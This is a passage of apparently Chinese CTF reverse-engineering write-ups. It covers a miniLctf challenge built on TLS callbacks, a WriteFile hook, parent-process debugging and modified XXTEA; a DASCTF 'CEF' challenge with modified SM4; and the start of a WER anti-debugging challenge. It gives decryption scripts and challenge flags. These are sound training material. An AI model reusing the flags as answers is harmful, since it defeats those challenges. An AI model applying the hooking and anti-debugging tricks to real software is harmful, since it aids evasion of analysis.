API的地址</li><li>将WriteFile API地址改成自写函数的地址（也就是Hook函数）</li><li>也就是之后我们调用WriteFile函数地址就会调用Hook函数（Hook函数里执行完Hook代码就会脱钩）</li></ul><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282046086.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282046086.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>GetModuleHandleA得到WiteFile函数的句柄，GetProcAddress函数获取WriteFile函数的地址存入dword_4043DC，并在sub_4016C0中将这个值修改为sub_401650的地址值。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282048757.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282048757.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>随后在第二个TLS函数会调用ExitProcess()，也就是退出进程，那么退出进程又会调用TLS函数链，于是又回到了第一个TLS函数，不过这次进的是退出线程的函数块，分析主要函数</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205281926308.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205281926308.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>这里创建了一个文件，也就是tmp文件，但是对名字也进行了混肴,然后往里面写入进程。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282139101.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282139101.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>我们可以发现这里的writefile变成了我们相要执行的函数</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282143122.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282143122.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>把子进程的两个值改成6，实践上是xxtea在加密过程中的右移轮次。</p><p>接下来分析一下tmp文件。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282152680.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282152680.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>其中</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282155309.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282155309.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>先判断是否被调试，然后对delta进行异或操作。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282153182.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282153182.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p><code>hObject = CreateFileMappingA(0, 0, 4u, 0, 0x1000u, Name_FLAG);</code>创建名字为FLAG的文件映射对象，用于进程间通信。<br><code>*(_DWORD *)input = MapViewOfFile(hObject, 0xF001Fu, 0, 0, 0x1000u);</code>存了内存映射文件，便于后面的共享内存。<br>简而言之，就是创建一个名为FLAG的文件映射对象，把input指向的地址设置成一块共享的内存，这样就可以在子进程里对input这块内存进行修改，实现加密。</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282154172.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282154172.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>一个魔改的XXTEA加密，z右移5改成了右移6位</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282201294.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282201294.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>这里一处函数需要注意</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282204815.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205282204815.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>WaitForDebugEvent表明父进程调用子进程是以调试方式打开，也就是说父进程调试子进程，所以实际上子进程的反调试是不能绕过的，正常执行程序应该会进入子进程的if语句，对key和delta进行一些魔改运算。<br>0xC0000005，这是一个异常代码，代表<code>EXCEPTION_ACCESS_VIOLATION</code>，内存访问异常，也即子进程中触发的异常。</p><p>也就是说，子进程被父进程调试，当子进程发生异常，应当交由调试者（父进程）处理。所以当子进程中触发异常，程序就会流回父进程，判断是否为内存访问异常，如果是，就对eip和eax做出相应修改。</p><p>再回去看子进程触发异常的地方，eip+5之后正好跳过了会触发异常的地方。而eax里存储的实际上是delta经过一通魔改运算之后的结果。也就是说，delta不仅在子进程里被修改，还会在父进程里异或一次，也就是还原成之前最初的模样</p><p>前一半的（修改的</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DELTA 0x1c925d64</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MX (((z&gt;&gt;6^y<span class="string">&lt;&lt;2) + (y&gt;</span>&gt;3^z&lt;&lt;4)) ^ ((sum^y) + (key[(p&amp;3)^e] ^ z)))</span></span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> k[<span class="number">4</span>]= &#123;<span class="number">0x12</span>,<span class="number">0x90</span>,<span class="number">0x56</span>,<span class="number">0x78</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">xxtea</span><span class="params">(<span class="type">uint32_t</span>* v, <span class="type">int</span> n, <span class="type">uint32_t</span>* key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> sum,z,p,y;</span><br><span class="line">    <span class="type">int</span> e, rounds;</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span>/n;</span><br><span class="line">    sum = rounds * DELTA;</span><br><span class="line">    y = v[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--)</span><br><span class="line">        &#123;</span><br><span class="line">            z = v[p<span class="number">-1</span>];</span><br><span class="line">            y = v[p] -= MX;</span><br><span class="line">        &#125;</span><br><span class="line">        z = v[n<span class="number">-1</span>];</span><br><span class="line">        y = v[<span class="number">0</span>] -= MX;</span><br><span class="line">        sum -= DELTA;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (--rounds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> v[<span class="number">5</span>] = &#123;<span class="number">0x6b7ce328</span>,<span class="number">0x4841d5dd</span>,<span class="number">0x963784dc</span>,<span class="number">0xef8a3226</span>,<span class="number">0x776b226</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">xxtea</span>(v, n, k);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,v[i]&amp;<span class="number">0xff</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,v[i]&gt;&gt;<span class="number">8</span>&amp;<span class="number">0xff</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,v[i]&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xff</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,v[i]&gt;&gt;<span class="number">24</span>&amp;<span class="number">0xff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后面那半就比较好出了，没有改任何Delta数或XXTEA算法</p><p>miniLctf{cbda59ff59e3e90c91c02e9b40b78b}</p><p>参考：<a href="http://www.yunzh1jun.com/2022/05/27/miniL/#Tip5%EF%BC%9Ahook">miniL2022 WP 今晚恰烤lq！ - 云之君 (yunzh1jun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TLS回调函数 </tag>
            
            <tag> 反调试 </tag>
            
            <tag> 异常处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CEF</title>
      <link href="/2022/05/27/cef/"/>
      <url>/2022/05/27/cef/</url>
      
        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205272105336.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205272105336.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>32位无壳程序</p><h1 id="CEF简介"><a href="#CEF简介" class="headerlink" title="CEF简介:"></a>CEF简介:</h1><p>  嵌入式Chromium框架(简称CEF) 是一个由Marshall Greenblatt在2008建立的开源项目，它主要目的是开发一个基于Google Chromium的Webbrowser控件。CEF支持一系列的编程语言和操作系统，并且能很容易地整合到新的或已有的工程中去。</p><h1 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h1><p>正面去分析的话，十分困难。去搜索相应字符串无果</p><p>这里我们可以去从数据调用去分析，我们去分析.data的数据</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205272116979.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205272116979.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>一组奇怪的数据，猜测加密时用到，交叉引用找到调用的地方</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205272122503.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205272122503.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>调试验证一下，一开始会停在调用的dll函数里面，我们直接步过，然后输入32位之后就会断下F9提示correct，验证我们的猜想是正确的。调试发现其实，加密整个逻辑就在else里面，一个魔改的SM4，其基本运算为异或^和循环左移&lt;&lt;&lt;</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205272231669.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205272231669.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>round函数</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205272222856.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205272222856.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>解密：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> SK[<span class="number">32</span>] = &#123;</span><br><span class="line">    <span class="number">0xE8DB227C</span>, <span class="number">0x012451B9</span>, <span class="number">0xED08A9DB</span>, <span class="number">0xC91F65C3</span>,</span><br><span class="line">         <span class="number">0xB3D1E981</span>, <span class="number">0x319B4734</span>, <span class="number">0xA4BA5551</span>, <span class="number">0xD0F2ED2D</span>,</span><br><span class="line">         <span class="number">0x4A00D692</span>, <span class="number">0xE0AEFE30</span>, <span class="number">0x6BBCDB4A</span>, <span class="number">0xC315F6F1</span>,</span><br><span class="line">         <span class="number">0xB4E1B030</span>, <span class="number">0x694C4ACE</span>, <span class="number">0x479208D3</span>, <span class="number">0x3F8C7B97</span>,</span><br><span class="line">         <span class="number">0x747777A6</span>, <span class="number">0xEDEC9BBB</span>, <span class="number">0xC8E506C1</span>, <span class="number">0xB955A92A</span>,</span><br><span class="line">         <span class="number">0xB388FDBB</span>, <span class="number">0x1A4697C3</span>, <span class="number">0xB10826AA</span>, <span class="number">0xBB1F2207</span>,</span><br><span class="line">         <span class="number">0x291DCD60</span>, <span class="number">0x2BA3E3A7</span>, <span class="number">0x1B83DFDD</span>, <span class="number">0x014D4FD5</span>,</span><br><span class="line">         <span class="number">0x80C659F3</span>, <span class="number">0x3EB45B23</span>, <span class="number">0x43E36266</span>, <span class="number">0xBD22532C</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_ULONG(n, b, i)\</span></span><br><span class="line"><span class="meta">(n) = ( (unsigned long) (b)[(i + 3)] &lt;&lt; 24 )\</span></span><br><span class="line"><span class="meta">| ( (unsigned long) (b)[(i + 2)] &lt;&lt; 16 )\</span></span><br><span class="line"><span class="meta">| ( (unsigned long) (b)[(i + 1)] &lt;&lt; 8  )\</span></span><br><span class="line"><span class="meta">| ( (unsigned long) (b)[(i    )]    ); \</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_ULONG(n, b, i)\</span></span><br><span class="line"><span class="meta">&#123;\</span></span><br><span class="line"><span class="meta">(b)[(i) + 3] = (unsigned char) ( (n) &gt;&gt; 24 );\</span></span><br><span class="line"><span class="meta">(b)[(i) + 2] = (unsigned char) ( (n) &gt;&gt; 16 );\</span></span><br><span class="line"><span class="meta">(b)[(i) + 1] = (unsigned char) ( (n) &gt;&gt; 8  );\</span></span><br><span class="line"><span class="meta">(b)[(i)    ] = (unsigned char) ( (n)   );\</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHL(x, n) ( ((x) &amp; 0xFFFFFFFF) &lt;&lt; n )</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ROTL(x, n) ( SHL((x), n) | ((x) &gt;&gt; (32 - n)) )</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAP(a, b) &#123; unsigned t = a; a = b; b = t; t = 0; &#125; </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SM4_Decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * input, <span class="type">unsigned</span> <span class="type">char</span> * output, <span class="type">int</span> len)</span></span>; </span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Round</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> input[<span class="number">16</span>], <span class="type">unsigned</span> <span class="type">char</span> output[<span class="number">16</span>])</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> input[] = </span><br><span class="line">&#123;</span><br><span class="line"> <span class="number">0x7D</span>, <span class="number">0x54</span>, <span class="number">0xCB</span>, <span class="number">0xC0</span>, <span class="number">0x74</span>, <span class="number">0xDB</span>, <span class="number">0xF5</span>, <span class="number">0xD7</span>, <span class="number">0x6F</span>, <span class="number">0xD9</span>,</span><br><span class="line">    <span class="number">0x92</span>, <span class="number">0x1B</span>, <span class="number">0xEB</span>, <span class="number">0x28</span>, <span class="number">0x46</span>, <span class="number">0x20</span>, <span class="number">0xE5</span>, <span class="number">0xD5</span>, <span class="number">0xD3</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0x80</span>, <span class="number">0x6D</span>, <span class="number">0x36</span>, <span class="number">0x2F</span>, <span class="number">0xB0</span>, <span class="number">0x63</span>, <span class="number">0x2F</span>, <span class="number">0x61</span>, <span class="number">0x20</span>, <span class="number">0x0F</span>,</span><br><span class="line">    <span class="number">0xA9</span>, <span class="number">0x30</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> output[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="built_in">SM4_Decrypt</span>(input, output, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++ )</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//printf(&quot;0x%X, &quot;, output[i]);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, output[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SM4_Decrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> * input, <span class="type">unsigned</span> <span class="type">char</span> * output, <span class="type">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++ )</span><br><span class="line"><span class="built_in">SWAP</span>(SK[i], SK[<span class="number">31</span> - i]);</span><br><span class="line"><span class="keyword">while</span> ( len &gt; <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">Round</span>(input, output);</span><br><span class="line"></span><br><span class="line">input += <span class="number">16</span>;</span><br><span class="line">output += <span class="number">16</span>;</span><br><span class="line">len -= <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Round</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> input[<span class="number">16</span>], <span class="type">unsigned</span> <span class="type">char</span> output[<span class="number">16</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> tmp[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> t = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">GET_ULONG</span>(tmp[<span class="number">0</span>], input, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">GET_ULONG</span>(tmp[<span class="number">1</span>], input, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">GET_ULONG</span>(tmp[<span class="number">2</span>], input, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">GET_ULONG</span>(tmp[<span class="number">3</span>], input, <span class="number">12</span>);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++ )</span><br><span class="line">&#123;</span><br><span class="line">t = SK[i] ^ tmp[(i + <span class="number">1</span>) % <span class="number">4</span>] ^ tmp[(i + <span class="number">2</span>) % <span class="number">4</span>] ^ tmp[(i + <span class="number">3</span>) % <span class="number">4</span>];</span><br><span class="line">tmp[i % <span class="number">4</span>] ^= t ^ <span class="built_in">ROTL</span>(t, <span class="number">2</span>) ^ <span class="built_in">ROTL</span>(t, <span class="number">24</span>) ^ <span class="built_in">ROTL</span>(t, <span class="number">10</span>) ^ <span class="built_in">ROTL</span>(t, <span class="number">18</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span> ; i &lt; <span class="number">4</span>; i++ )</span><br><span class="line"><span class="built_in">GET_ULONG</span>(SK[<span class="number">26</span> - i], input, i * <span class="number">4</span>);<span class="comment">// 正好是把加密后的值放入 那么解密的时候就是把密文放入即可 </span></span><br><span class="line"><span class="built_in">PUT_ULONG</span>(tmp[<span class="number">3</span>], output, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">PUT_ULONG</span>(tmp[<span class="number">2</span>], output, <span class="number">4</span>);</span><br><span class="line"><span class="built_in">PUT_ULONG</span>(tmp[<span class="number">1</span>], output, <span class="number">8</span>);</span><br><span class="line"><span class="built_in">PUT_ULONG</span>(tmp[<span class="number">0</span>], output, <span class="number">12</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行得到 3b2365b04700b5eac3a5fd0ba21b687f</p><p>参考：<a href="https://ppppz.net/2022/05/26/DASCTF2022-X-VOID-CEF/">DASCTF2022 X VOID-CEF - P.Z’s Blog (ppppz.net)</a></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -CEF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WER</title>
      <link href="/2022/05/26/WER/"/>
      <url>/2022/05/26/WER/</url>
      
        <content type="html"><![CDATA[<p>无壳，64位</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205262127014.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205262127014.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><div class="story post-story"><h2 id="什么是WER："><a href="#什么是WER：" class="headerlink" title="什么是WER："></a>什么是WER：</h2><p>Windows 错误报告 (WER) 是一种灵活的基于事件的反馈基础结构，旨在收集有关Windows可以检测、向 Microsoft 报告信息以及为用户提供任何可用解决方案的硬件和软件问题的相关信息。</p><p>参考：<a href="https://docs.microsoft.com/zh-cn/windows/win32/wer/about-wer">关于 WER - Win32 apps | Microsoft Docs</a></p><p>其关键函数如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD WINAPI <span class="title">ApplicationRecoveryCallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">   PVOID pvParameter <span class="comment">//上下文信息在调用‎‎注册应用程序恢复回拨‎‎函数以注册恢复时指定。‎</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>‎应用程序定义的回调函数，用于在应用程序遇到未处理的异常或无响应时保存数据和应用程序状态信息。</p><p>参考：<a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa373202(v=vs.85)">ApplicationRecoveryCallback callback function (Windows) | Microsoft Docs</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HRESULT <span class="title">WerReportHang</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           HWND   hwndHungApp, <span class="comment">//‎处理未响应的窗口。</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PCWSTR pwzHungApplicationName <span class="comment">//要在挂起的报告 UI 中显示的无响应应用程序的名称。</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>返回值‎：‎返回S_OK函数是否能够在失败时启动报告或错误代码。请注意，S_OK并不一定意味着“无响应”报告已成功完成，而只是表示已启动。‎</p><p>参考：<a href="https://docs.microsoft.com/en-us/windows/win32/api/errorrep/nf-errorrep-werreporthang">WerReportHang function (errorrep.h) - Win32 apps | Microsoft Docs</a></p><p>主要运行逻辑为：</p><p>1.在初始化注册ApplicationRecoveryCallback函数</p><p>2.在OnExit调用WerReportHang触发异常</p><p>3.运用ApplicationRecoveryCallback进行真正的逻辑处理。</p><p>本题OnExit函数就在main函数里面，调用WerReportHang就会关闭调试器，调试不起来</p></div><div class="story post-story"><h2 id="解题："><a href="#解题：" class="headerlink" title="解题："></a>解题：</h2><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205262200156.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205262200156.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>搜索关键函数，在import表里面找到，放在了一个dll里面</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205262210102.png" class="lazyload" data-srcset="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205262210102.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></p><p>然后交叉引用找到：</p><p><img src="https://cdn.jsdelivr.net/gh/1ens/blogImages/imgs/202205262210460.png" class="lazyload" 